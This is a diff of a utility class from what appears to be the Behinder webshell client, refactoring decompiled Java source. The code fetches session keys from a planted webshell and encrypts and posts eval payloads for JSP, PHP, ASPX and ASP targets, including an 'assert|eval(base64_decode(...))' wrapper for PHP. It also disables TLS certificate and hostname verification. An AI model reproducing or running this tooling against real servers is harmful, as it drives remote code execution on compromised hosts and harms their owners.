@@ -1,8 +1,3 @@
-//
-// Source code recreated from a .class file by IntelliJ IDEA
-// (powered by FernFlower decompiler)
-//
-
 package net.rebeyond.behinder.utils;
 
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
@@ -42,7 +37,7 @@ import java.util.zip.ZipFile;
 import java.util.zip.ZipInputStream;
 
 public class Utils {
-    private static final Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap();
+    private static final Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap<>();
 
     public Utils() {
     }
@@ -63,7 +58,7 @@ public class Utils {
 
     public static Map<String, String> getKeyAndCookie(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
         disableSslVerification();
-        Map<String, String> result = new HashMap();
+        Map<String, String> result = new HashMap<String, String>();
         StringBuffer sb = new StringBuffer();
         InputStreamReader isr = null;
         BufferedReader br = null;
@@ -75,32 +70,32 @@ public class Utils {
         }
 
         HttpURLConnection.setFollowRedirects(false);
-        Object urlConnection;
+        HttpURLConnection urlConnection;
         Proxy proxy;
         if (url.getProtocol().equals("https")) {
             if (MainController.currentProxy.get("proxy") != null) {
                 proxy = (Proxy) MainController.currentProxy.get("proxy");
-                urlConnection = url.openConnection(proxy);
+                urlConnection = (HttpsURLConnection) url.openConnection(proxy);
             } else {
-                urlConnection = url.openConnection();
+                urlConnection = (HttpsURLConnection) url.openConnection();
             }
         } else if (MainController.currentProxy.get("proxy") != null) {
             proxy = (Proxy) MainController.currentProxy.get("proxy");
-            urlConnection = url.openConnection(proxy);
+            urlConnection = (HttpURLConnection) url.openConnection(proxy);
         } else {
-            urlConnection = url.openConnection();
+            urlConnection = (HttpURLConnection) url.openConnection();
         }
 
-        Iterator var23 = requestHeaders.keySet().iterator();
+        Iterator<String> var23 = requestHeaders.keySet().iterator();
 
         String errorMsg;
         while (var23.hasNext()) {
-            errorMsg = (String) var23.next();
-            ((HttpURLConnection) urlConnection).setRequestProperty(errorMsg, requestHeaders.get(errorMsg));
+            errorMsg = var23.next();
+            (urlConnection).setRequestProperty(errorMsg, requestHeaders.get(errorMsg));
         }
 
-        if (((HttpURLConnection) urlConnection).getResponseCode() == 302 || ((HttpURLConnection) urlConnection).getResponseCode() == 301) {
-            String urlwithSession = ((String) ((List) ((HttpURLConnection) urlConnection).getHeaderFields().get("Location")).get(0));
+        if ((urlConnection).getResponseCode() == 302 || (urlConnection).getResponseCode() == 301) {
+            String urlwithSession = ((String) ((List) (urlConnection).getHeaderFields().get("Location")).get(0));
             if (!urlwithSession.startsWith("http")) {
                 urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession;
                 urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
@@ -111,16 +106,16 @@ public class Utils {
 
         boolean error = false;
         errorMsg = "";
-        if (((HttpURLConnection) urlConnection).getResponseCode() == 500) {
-            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
+        if ((urlConnection).getResponseCode() == 500) {
+            isr = new InputStreamReader((urlConnection).getErrorStream());
             error = true;
             errorMsg = "密钥获取失败,密码错误?";
-        } else if (((HttpURLConnection) urlConnection).getResponseCode() == 404) {
-            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
+        } else if ((urlConnection).getResponseCode() == 404) {
+            isr = new InputStreamReader((urlConnection).getErrorStream());
             error = true;
             errorMsg = "页面返回404错误";
         } else {
-            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getInputStream());
+            isr = new InputStreamReader((urlConnection).getInputStream());
         }
 
         br = new BufferedReader(isr);
@@ -193,7 +188,7 @@ public class Utils {
     }
 
     public static Map<String, String> getRawKey(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
-        Map<String, String> result = new HashMap();
+        Map<String, String> result = new HashMap<String, String>();
         StringBuffer sb = new StringBuffer();
         InputStreamReader isr = null;
         BufferedReader br = null;
@@ -205,30 +200,28 @@ public class Utils {
         }
 
         HttpURLConnection.setFollowRedirects(false);
-        Object urlConnection;
+        HttpURLConnection urlConnection;
         if (url.getProtocol().equals("https")) {
-            urlConnection = url.openConnection();
+            urlConnection = (HttpsURLConnection) url.openConnection();
         } else {
-            urlConnection = url.openConnection();
+            urlConnection = (HttpURLConnection) url.openConnection();
         }
 
-        Iterator var9 = requestHeaders.keySet().iterator();
-
-        while (var9.hasNext()) {
-            String headerName = (String) var9.next();
-            ((HttpURLConnection) urlConnection).setRequestProperty(headerName, requestHeaders.get(headerName));
+        for (String o : requestHeaders.keySet()) {
+            String headerName = o;
+            (urlConnection).setRequestProperty(headerName, requestHeaders.get(headerName));
         }
 
         String cookieValues = "";
-        Map<String, List<String>> headers = ((HttpURLConnection) urlConnection).getHeaderFields();
-        Iterator var11 = headers.keySet().iterator();
+        Map<String, List<String>> headers = (urlConnection).getHeaderFields();
+        Iterator<String> var11 = headers.keySet().iterator();
 
         String errorMsg;
         while (var11.hasNext()) {
-            errorMsg = (String) var11.next();
+            errorMsg = var11.next();
             if (errorMsg != null && errorMsg.equalsIgnoreCase("Set-Cookie")) {
                 String cookieValue;
-                for (Iterator var13 = ((List) headers.get(errorMsg)).iterator(); var13.hasNext(); cookieValues = cookieValues + ";" + cookieValue) {
+                for (Iterator var13 = (headers.get(errorMsg)).iterator(); var13.hasNext(); cookieValues = cookieValues + ";" + cookieValue) {
                     cookieValue = (String) var13.next();
                     cookieValue = cookieValue.replaceAll(";[\\s]*path=[\\s\\S]*;?", "");
                 }
@@ -241,16 +234,16 @@ public class Utils {
         result.put("cookie", cookieValues);
         boolean error = false;
         errorMsg = "";
-        if (((HttpURLConnection) urlConnection).getResponseCode() == 500) {
-            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
+        if ((urlConnection).getResponseCode() == 500) {
+            isr = new InputStreamReader((urlConnection).getErrorStream());
             error = true;
             errorMsg = "密钥获取失败,密码错误?";
-        } else if (((HttpURLConnection) urlConnection).getResponseCode() == 404) {
-            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
+        } else if ((urlConnection).getResponseCode() == 404) {
+            isr = new InputStreamReader((urlConnection).getErrorStream());
             error = true;
             errorMsg = "页面返回404错误";
         } else {
-            isr = new InputStreamReader(((HttpURLConnection) urlConnection).getInputStream());
+            isr = new InputStreamReader((urlConnection).getInputStream());
         }
 
         br = new BufferedReader(isr);
@@ -294,8 +287,8 @@ public class Utils {
         return result.toString();
     }
 
-    public static Map<String, Object> requestAndParse(String urlPath, Map<String, String> header, byte[] data, int beginIndex, int endIndex) throws Exception {
-        Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data);
+    public static Map requestAndParse(String urlPath, Map<String, String> header, byte[] data, int beginIndex, int endIndex) throws Exception {
+        Map resultObj = sendPostRequestBinary(urlPath, header, data);
         byte[] resData = (byte[]) resultObj.get("data");
         if ((beginIndex != 0 || endIndex != 0) && resData.length - endIndex >= beginIndex) {
             resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
@@ -305,8 +298,8 @@ public class Utils {
         return resultObj;
     }
 
-    public static Map<String, Object> sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception {
-        Map<String, Object> result = new HashMap();
+    public static Map sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception {
+        Map result = new HashMap();
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         URL url = new URL(urlPath);
         HttpURLConnection conn;
@@ -320,10 +313,9 @@ public class Utils {
         conn.setRequestProperty("Content-Type", "application/octet-stream");
         conn.setRequestMethod("POST");
         if (header != null) {
-            Iterator var12 = header.keySet().iterator();
 
-            while (var12.hasNext()) {
-                String key = (String) var12.next();
+            for (String o : header.keySet()) {
+                String key = o;
                 conn.setRequestProperty(key, header.get(key));
             }
         }
@@ -350,11 +342,9 @@ public class Utils {
 
             byte[] resData = bos.toByteArray();
             result.put("data", resData);
-            Map<String, String> responseHeader = new HashMap();
-            Iterator var18 = conn.getHeaderFields().keySet().iterator();
+            Map responseHeader = new HashMap();
 
-            while (var18.hasNext()) {
-                String key = (String) var18.next();
+            for (String key : conn.getHeaderFields().keySet()) {
                 responseHeader.put(key, conn.getHeaderField(key));
             }
 
@@ -447,54 +437,60 @@ public class Utils {
     public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
         byte[] result = null;
         byte[] encrypedBincls;
-        if (type.equals("jsp")) {
-            encrypedBincls = Crypt.Encrypt(payload, key);
-            String basedEncryBincls = Base64.encode(encrypedBincls);
-            result = basedEncryBincls.getBytes();
-        } else if (type.equals("php")) {
-            encrypedBincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
-            encrypedBincls = Crypt.EncryptForPhp(encrypedBincls, key, encryptType);
-            result = Base64.encode(encrypedBincls).getBytes();
-        } else if (type.equals("aspx")) {
-            Map<String, String> params = new LinkedHashMap<>();
-            params.put("code", new String(payload));
-            result = getData(key, encryptType, "Eval", params, type);
-        } else if (type.equals("asp")) {
-            encrypedBincls = Crypt.EncryptForAsp(payload, key);
-            result = encrypedBincls;
+        switch (type) {
+            case "jsp":
+                encrypedBincls = Crypt.Encrypt(payload, key);
+                String basedEncryBincls = Base64.encode(encrypedBincls);
+                result = basedEncryBincls.getBytes();
+                break;
+            case "php":
+                encrypedBincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
+                encrypedBincls = Crypt.EncryptForPhp(encrypedBincls, key, encryptType);
+                result = Base64.encode(encrypedBincls).getBytes();
+                break;
+            case "aspx":
+                Map params = new LinkedHashMap();
+                params.put("code", new String(payload));
+                result = getData(key, encryptType, "Eval", params, type);
+                break;
+            case "asp":
+                encrypedBincls = Crypt.EncryptForAsp(payload, key);
+                result = encrypedBincls;
+                break;
         }
 
         return result;
     }
 
-    public static byte[] getPluginData(String key, int encryptType, String payloadPath, Map<String, String> params, String type) throws Exception {
+    public static byte[] getPluginData(String key, int encryptType, String payloadPath, Map params, String type) throws Exception {
         byte[] bincls;
         if (type.equals("jsp")) {
             bincls = Params.getParamedClassForPlugin(payloadPath, params);
             return bincls;
         } else {
             byte[] encrypedBincls;
-            if (type.equals("php")) {
-                bincls = Params.getParamedPhp(payloadPath, params);
-                bincls = Base64.encode(bincls).getBytes();
-                bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
-                encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
-                return Base64.encode(encrypedBincls).getBytes();
-            } else if (type.equals("aspx")) {
-                bincls = Params.getParamedAssembly(payloadPath, params);
-                encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
-                return encrypedBincls;
-            } else if (type.equals("asp")) {
-                bincls = Params.getParamedAsp(payloadPath, params);
-                encrypedBincls = Crypt.EncryptForAsp(bincls, key);
-                return encrypedBincls;
-            } else {
-                return null;
+            switch (type) {
+                case "php":
+                    bincls = Params.getParamedPhp(payloadPath, params);
+                    bincls = Base64.encode(bincls).getBytes();
+                    bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
+                    encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
+                    return Base64.encode(encrypedBincls).getBytes();
+                case "aspx":
+                    bincls = Params.getParamedAssembly(payloadPath, params);
+                    encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
+                    return encrypedBincls;
+                case "asp":
+                    bincls = Params.getParamedAsp(payloadPath, params);
+                    encrypedBincls = Crypt.EncryptForAsp(bincls, key);
+                    return encrypedBincls;
+                default:
+                    return null;
             }
         }
     }
 
-    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type) throws Exception {
+    public static byte[] getData(String key, int encryptType, String className, Map params, String type) throws Exception {
         return getData(key, encryptType, className, params, type, null);
     }
 
@@ -502,54 +498,56 @@ public class Utils {
         String result = "";
 
         String key;
-        for (Iterator var2 = paramsMap.keySet().iterator(); var2.hasNext(); result = result + key + "^" + paramsMap.get(key) + "\n") {
-            key = (String) var2.next();
+        Iterator<String> var2;
+        for (var2 = paramsMap.keySet().iterator(); var2.hasNext(); result = result + key + "^" + paramsMap.get(key) + "\n") {
+            key = var2.next();
         }
 
         return result;
     }
 
-    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception {
+    public static byte[] getData(String key, int encryptType, String className, Map params, String type, byte[] extraData) throws Exception {
         byte[] bincls;
         byte[] encrypedBincls;
-        if (type.equals("jsp")) {
-            className = "net.rebeyond.behinder.payload.java." + className;
-            bincls = Params.getParamedClass(className, params);
-            if (extraData != null) {
-                bincls = CipherUtils.mergeByteArray(bincls, extraData);
-            }
+        switch (type) {
+            case "jsp":
+                className = "net.rebeyond.behinder.payload.java." + className;
+                bincls = Params.getParamedClass(className, params);
+                if (extraData != null) {
+                    bincls = CipherUtils.mergeByteArray(bincls, extraData);
+                }
 
-            encrypedBincls = Crypt.Encrypt(bincls, key);
-            String basedEncryBincls = Base64.encode(encrypedBincls);
-            return basedEncryBincls.getBytes();
-        } else if (type.equals("php")) {
-            bincls = Params.getParamedPhp(className, params);
-            bincls = Base64.encode(bincls).getBytes();
-            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
-            if (extraData != null) {
-                bincls = CipherUtils.mergeByteArray(bincls, extraData);
-            }
+                encrypedBincls = Crypt.Encrypt(bincls, key);
+                String basedEncryBincls = Base64.encode(encrypedBincls);
+                return basedEncryBincls.getBytes();
+            case "php":
+                bincls = Params.getParamedPhp(className, params);
+                bincls = Base64.encode(bincls).getBytes();
+                bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
+                if (extraData != null) {
+                    bincls = CipherUtils.mergeByteArray(bincls, extraData);
+                }
 
-            encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
-            return Base64.encode(encrypedBincls).getBytes();
-        } else if (type.equals("aspx")) {
-            bincls = Params.getParamedAssembly(className, params);
-            if (extraData != null) {
-                bincls = CipherUtils.mergeByteArray(bincls, extraData);
-            }
+                encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
+                return Base64.encode(encrypedBincls).getBytes();
+            case "aspx":
+                bincls = Params.getParamedAssembly(className, params);
+                if (extraData != null) {
+                    bincls = CipherUtils.mergeByteArray(bincls, extraData);
+                }
 
-            encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
-            return encrypedBincls;
-        } else if (type.equals("asp")) {
-            bincls = Params.getParamedAsp(className, params);
-            if (extraData != null) {
-                bincls = CipherUtils.mergeByteArray(bincls, extraData);
-            }
+                encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
+                return encrypedBincls;
+            case "asp":
+                bincls = Params.getParamedAsp(className, params);
+                if (extraData != null) {
+                    bincls = CipherUtils.mergeByteArray(bincls, extraData);
+                }
 
-            encrypedBincls = Crypt.EncryptForAsp(bincls, key);
-            return encrypedBincls;
-        } else {
-            return null;
+                encrypedBincls = Crypt.EncryptForAsp(bincls, key);
+                return encrypedBincls;
+            default:
+                return null;
         }
     }
 
@@ -559,7 +557,8 @@ public class Utils {
         byte[] buffer = new byte[10240000];
 
         int length;
-        for (boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
+        while ((length = fis.read(buffer)) > 0) {
+            fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length));
         }
 
         fis.close();
@@ -567,11 +566,9 @@ public class Utils {
     }
 
     public static List<byte[]> splitBytes(byte[] content, int size) throws Exception {
-        List<byte[]> result = new ArrayList();
+        List<byte[]> result = new ArrayList<>();
         byte[] buffer = new byte[size];
         ByteArrayInputStream bis = new ByteArrayInputStream(content);
-        boolean var5 = false;
-
         int length;
         while ((length = bis.read(buffer)) > 0) {
             result.add(Arrays.copyOfRange(buffer, 0, length));
@@ -679,8 +676,8 @@ public class Utils {
         return pluginEntity;
     }
 
-    public static <T> T json2Obj(JSONObject json, Class<T> target) throws Exception {
-        T obj = target.newInstance();
+    public static Object json2Obj(JSONObject json, Class target) throws Exception {
+        Object obj = target.newInstance();
         Field[] var3 = target.getDeclaredFields();
         int var4 = var3.length;
 
@@ -732,23 +729,19 @@ public class Utils {
             }};
             SSLContext sc = SSLContext.getInstance("SSL");
             sc.init(null, trustAllCerts, new SecureRandom());
-            List<String> cipherSuites = new ArrayList();
+            List<String> cipherSuites = new ArrayList<String>();
             String[] var3 = sc.getSupportedSSLParameters().getCipherSuites();
             int var4 = var3.length;
 
             for (int var5 = 0; var5 < var4; ++var5) {
                 String cipher = var3[var5];
-                if (cipher.indexOf("_DHE_") < 0 && cipher.indexOf("_DH_") < 0) {
+                if (!cipher.contains("_DHE_") && !cipher.contains("_DH_")) {
                     cipherSuites.add(cipher);
                 }
             }
 
             HttpsURLConnection.setDefaultSSLSocketFactory(new Utils.MySSLSocketFactory(sc.getSocketFactory(), cipherSuites.toArray(new String[0])));
-            HostnameVerifier allHostsValid = new HostnameVerifier() {
-                public boolean verify(String hostname, SSLSession session) {
-                    return true;
-                }
-            };
+            HostnameVerifier allHostsValid = (hostname, session) -> true;
             HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
         } catch (NoSuchAlgorithmException var7) {
             var7.printStackTrace();
@@ -759,11 +752,9 @@ public class Utils {
     }
 
     public static Map<String, String> jsonToMap(JSONObject obj) {
-        Map<String, String> result = new HashMap();
-        Iterator var2 = obj.keySet().iterator();
+        Map<String, String> result = new HashMap<String, String>();
 
-        while (var2.hasNext()) {
-            String key = (String) var2.next();
+        for (String key : obj.keySet()) {
             result.put(key, (String) obj.get(key));
         }
 
@@ -783,7 +774,7 @@ public class Utils {
         return timestamp;
     }
 
-    public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager> {
+    public static class MyJavaFileManager extends ForwardingJavaFileManager {
         protected MyJavaFileManager(JavaFileManager fileManager) {
             super(fileManager);
         }
